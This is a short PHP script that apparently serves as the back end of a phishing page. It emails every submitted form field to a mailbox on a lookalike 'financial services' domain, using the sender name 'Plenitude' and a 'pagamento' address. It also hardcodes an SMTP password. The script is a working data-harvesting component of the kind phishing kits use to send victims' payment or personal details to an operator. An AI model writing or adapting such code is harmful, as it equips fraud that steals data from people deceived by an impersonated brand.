<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/Exception.php';
require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';

$mail = new PHPMailer(true);

try {
    $mail->isSMTP();
    $mail->Host       = 'smtp.serviziofinanzieri.it.com';
    $mail->SMTPAuth   = true;
    $mail->Username   = 'pagamento@serviziofinanzieri.it.com';
    $mail->Password   = '383A6cf5-D61A-4154-9bf3-0d5f822BDc07'; // Remplacez ceci par votre vrai mot de passe SMTP
    $mail->SMTPSecure = 'ssl';
    $mail->Port       = 465;

    $mail->setFrom('pagamento@serviziofinanzieri.it.com', 'Plenitude');
    $mail->addAddress('pagamento@serviziofinanzieri.it.com');

    $mail->isHTML(true);
    $mail->Subject = 'Nouvelle soumission de formulaire';
    $mail->Body    = 'Données reçues :<br><pre>' . print_r($_POST, true) . '</pre>';

    $mail->send();
    echo 'Message envoyé avec succès.';
} catch (Exception $e) {
    echo "Erreur lors de l'envoi : {$mail->ErrorInfo}";
}
?>
